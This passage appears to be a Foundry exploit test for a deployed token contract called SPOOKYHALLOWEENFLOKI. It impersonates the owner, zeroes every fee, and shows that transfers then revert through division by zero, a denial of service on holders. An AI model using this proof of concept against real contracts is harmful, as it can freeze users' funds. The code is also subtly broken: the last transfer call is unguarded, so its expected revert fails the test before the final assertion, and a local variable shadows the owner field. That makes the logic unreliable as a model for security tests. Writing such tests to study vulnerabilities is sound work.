}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address owner;
    address victim = address(0x999);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        owner = SPOOKYHALLOWEENFLOKI(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "SHF Token");

        // We'll need some tokens to test the transfer
        // First, get some tokens from the owner (who has all supply)
        deal(TARGET, attacker, 1000 * 10**9); // Give attacker some tokens

        // Also give tokens to another address for transfer testing
        deal(TARGET, victim, 1000 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address
        address owner = SPOOKYHALLOWEENFLOKI(TARGET).getOwner();

        // Step 2: Impersonate owner to set all fees to zero
        vm.startPrank(owner);
        SPOOKYHALLOWEENFLOKI(TARGET).setFees_base1000(0, 0, 0, 0, 0, 0);
        SPOOKYHALLOWEENFLOKI(TARGET).tradingStatus(true);
        vm.stopPrank();

        // Step 3: Verify totalFee is zero (oracle verification)
        uint256 totalFeeAfter = SPOOKYHALLOWEENFLOKI(TARGET).totalFee();
        assertEq(totalFeeAfter, 0, "totalFee should be zero after setting all fees to zero");

        // Step 4: Prepare addresses for transfer test
        // Create two new addresses that won't be fee exempt
        address sender = address(0x111);
        address recipient = address(0x222);

        // Give sender some tokens
        uint256 transferAmount = 100 * 10**9;
        deal(TARGET, sender, transferAmount * 10); // Give extra tokens

        // Verify neither address is fee exempt
        bool isSenderFeeExempt = SPOOKYHALLOWEENFLOKI(TARGET).isFeeExempt(sender);
        bool isRecipientFeeExempt = SPOOKYHALLOWEENFLOKI(TARGET).isFeeExempt(recipient);

        require(!isSenderFeeExempt, "Sender should not be fee exempt");
        require(!isRecipientFeeExempt, "Recipient should not be fee exempt");

        // Step 5: Attempt transfer - should revert due to division by zero in takeFee()
        // We'll use transferFrom since we can control it from the test contract
        vm.prank(sender);
        SPOOKYHALLOWEENFLOKI(TARGET).approve(address(this), transferAmount);

        // The transfer should revert because takeFee() will divide by zero
        // when calculating burnTokens = feeAmount.mul(burnFee).div(totalFee)
        // where totalFee = 0
        bool success = false;
        try SPOOKYHALLOWEENFLOKI(TARGET).transferFrom(sender, recipient, transferAmount) {
            success = true;
        } catch {
            success = false;
        }

        // The transfer should fail due to division by zero
        assertFalse(success, "Transfer should revert due to division by zero when totalFee = 0");

        // Alternative: test direct transfer
        vm.prank(sender);
        bool directSuccess = SPOOKYHALLOWEENFLOKI(TARGET).transfer(recipient, transferAmount);
        assertFalse(directSuccess, "Direct transfer should also revert");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

